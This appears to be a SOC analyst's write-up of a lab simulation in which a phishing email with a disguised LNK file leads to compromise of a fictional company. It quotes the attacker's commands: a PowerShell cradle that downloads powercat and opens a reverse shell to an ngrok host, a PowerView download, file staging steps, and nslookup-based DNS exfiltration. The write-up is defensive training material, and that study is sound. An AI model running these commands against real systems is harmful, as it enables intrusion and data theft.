Scenario Overview

This SOC simulation places you inside the Security Operations Center of TryHatMe, a fictional e-commerce company. A live, multi-stage phishing attack is unfolding against the corporate network in real time. As the on-duty SOC Analyst, your responsibilities include monitoring and triaging incoming alerts, investigating using the SIEM and Analyst VM, distinguishing true positives from false positives, reconstructing the full attack chain, and writing detailed case reports.

"A suspicious email has been received by a high-value target. The clock is ticking — triage, investigate, and document every move before the attacker completes their objective."

Attack Chain

📧 Spearphishing Email → 📎 Malicious LNK → ⚡ PowerShell Execution → 🔌 Reverse Shell (ngrok) → 🔍 Reconnaissance → 📂 Data Collection → 📡 DNS Exfiltration → 🧹 Cleanup

Investigation

PHASE 1 Alert Triage — Suspicious Email Attachment

Starting from the Dashboard, I prioritized high-severity alerts and worked through the queue. Among the initial alerts was a Suspicious Email Attachment alert (Low Severity) that warranted immediate investigation:

Alert ID~1007 / 1015
Datasourceemails
Senderjohn@hatmakereurope.xyz
Recipientmichael.ascot@tryhatme.com
Subject"Important: Pending Invoice!"
AttachmentImportantInvoice-February.zip

Domain reputation check: Using the Analyst VM's TryDetectThis tool, I checked hatmakereurope.xyz. The domain appeared clean — however, it was a newly registered lookalike domain designed to impersonate a legitimate business partner. Domain reputation alone is insufficient; the timing, context, and attachment content must be evaluated.

Attachment analysis: I extracted the ZIP archive on the Analyst VM. Inside was a file named invoice.pdf.lnk — not a real PDF, but a Windows shortcut file (LNK) masquerading as a document. This is a classic malware delivery technique that exploits Windows' default behavior of hiding file extensions.

Examining the LNK target revealed a malicious PowerShell one-liner:

powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString(
  'https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'
); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell"

This payload performs two critical actions:

  • Downloads powercat.ps1 — a PowerShell implementation of Netcat — from a public GitHub repository.
  • Establishes a reverse shell back to the attacker's C2 infrastructure at 2.tcp.ngrok.io:19282, tunneled through ngrok to obscure the attacker's true IP.
⚠️ VERDICT: True Positive — Spearphishing attachment delivering a PowerShell reverse shell via malicious LNK file.

PHASE 3 Initial Execution & Reconnaissance

The execution chain began when Outlook downloaded the attachment, Explorer extracted the ZIP, and the user double-clicked the disguised LNK file. This spawned PowerShell, which downloaded and executed powercat.ps1 to establish the reverse shell.

With shell access, the attacker immediately began reconnaissance:

# System & user enumeration
whoami
systeminfo

# Active Directory reconnaissance
IEX(New-Object Net.WebClient).DownloadString('...PowerView.ps1')

The attacker downloaded and executed PowerView.ps1, a well-known Active Directory enumeration tool from the PowerSploit framework, to map the internal network and identify high-value targets.

✓ Confirmed — PowerShell spawning whoami, systeminfo, and loading PowerView.ps1 from win-3450.

PHASE 4 Data Collection & Staging

The attacker created a staging directory and mapped a network share to access sensitive financial documents:

# Create staging directory
mkdir C:\Users\michael.ascot\Downloads\exfiltration

# Map network share
net use Z: \\FILESRV-01\SSF-FinancialRecords

# Copy sensitive files
robocopy Z:\ C:\Users\michael.ascot\Downloads\exfiltration\ 
    InvestorPresentation2023.pptx
    ClientPortfolioSummary.xlsx

The attacker used robocopy — a legitimate Windows utility — to copy financial documents from the FILESRV-01 file server into the local staging directory. The targeted files (InvestorPresentation2023.pptx and ClientPortfolioSummary.xlsx) indicate the attacker had specific intelligence about the organization's data structure.

⚠ Critical — Sensitive financial data accessed and staged for exfiltration from \\FILESRV-01\SSF-FinancialRecords.

PHASE 5 Exfiltration via DNS Tunneling

Rather than exfiltrating data over HTTP/S (which would likely be caught by proxy/DLP controls), the attacker employed DNS tunneling — a covert channel technique that encodes data within DNS queries:

# Compress and encode stolen data
Compress-Archive ... -DestinationPath exfilt8me.zip
$b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes('exfilt8me.zip'))

# Exfiltrate via DNS queries in chunks
nslookup <base64-chunk-1>.haz4rdw4re.io
nslookup <base64-chunk-2>.haz4rdw4re.io
nslookup <base64-chunk-3>.haz4rdw4re.io
...

Each DNS query encodes a chunk of Base64-encoded data as a subdomain of the attacker-controlled domain haz4rdw4re.io. On the attacker's authoritative DNS server, these queries are reassembled into the original file. This technique is effective because DNS traffic is rarely inspected by traditional security controls.

⚠ Critical — Data exfiltrated via DNS tunneling to haz4rdw4re.io using nslookup as the transport mechanism.

PHASE 6 Cleanup & Anti-Forensics

After completing the exfiltration, the attacker disconnected the mapped network share to reduce their forensic footprint:

net use Z: /delete

This attempt at indicator removal is a common post-exploitation practice, though the activity was already captured in the SIEM logs.

PHASE 7 False Positive Triage

Not all alerts were malicious. An alert related to Yani Zubair (IT department) flagged a PowerShell script attachment named forceupdate.ps1. Upon analysis, this was a legitimate Windows update and system diagnostics script used internally by IT, which sends reports back to the IT account.

ℹ VERDICT: False Positive — Legitimate IT automation script for Windows updates and system diagnostics.

Recommended Remediation

  • Isolate win-3450 — Immediately disconnect the host from the network to prevent further lateral movement or data exfiltration.
  • Reset credentials — Force a password reset for michael.ascot and any accounts that accessed FILESRV-01.
  • Block IOCs — Add all identified domains, URLs, and file hashes to firewall, proxy, and email gateway blocklists.
  • Threat hunt — Search for similar LNK attachments, PowerShell download cradles, and DNS tunneling patterns across the environment.
  • Review share permissions — Audit access controls on FILESRV-01 and restrict financial records to need-to-know access.
  • DNS monitoring — Implement DNS query length and frequency anomaly detection to catch tunneling attempts.
  • User awareness training — Conduct targeted training on invoice-themed phishing and LNK file risks, especially for executive staff.

Key Takeaways

🎣 Low-Severity Alerts Can Be High-Impact

The initial phishing email was flagged as low severity. A hasty analyst could have dismissed it. The domain appeared clean, and the attachment name looked benign. Always investigate email alerts in full context — examine the attachment, not just the metadata.

🔗 Reconstruct the Kill Chain, Don't Triage in Isolation

Individual alerts (process creation, network access, DNS queries) may seem unrelated. The real skill is correlating them into a single attack narrative: phishing → execution → C2 → recon → collection → exfiltration → cleanup. This is what separates an alert processor from a threat analyst.

📡 DNS Is a Blind Spot

DNS tunneling via nslookup is a powerful exfiltration method because DNS traffic is rarely inspected by DLP or proxy controls. Organizations should monitor for abnormal DNS query patterns: excessive query lengths, high query volumes to a single domain, and Base64-encoded subdomains.

🏠 Living-Off-the-Land Is Hard to Detect

Every tool the attacker used — powershell.exe, nslookup.exe, robocopy.exe, net.exe — is a legitimate Windows binary. This makes signature-based detection ineffective. Behavioral analysis and parent-child process relationship monitoring are essential for catching LOLBin abuse.

✍️ Professional Case Reporting Matters

In a real SOC, your case report is the deliverable. It needs to clearly communicate the timeline, affected entities, classification rationale, and remediation steps. A well-written report accelerates incident response and provides the evidence trail for post-incident review.
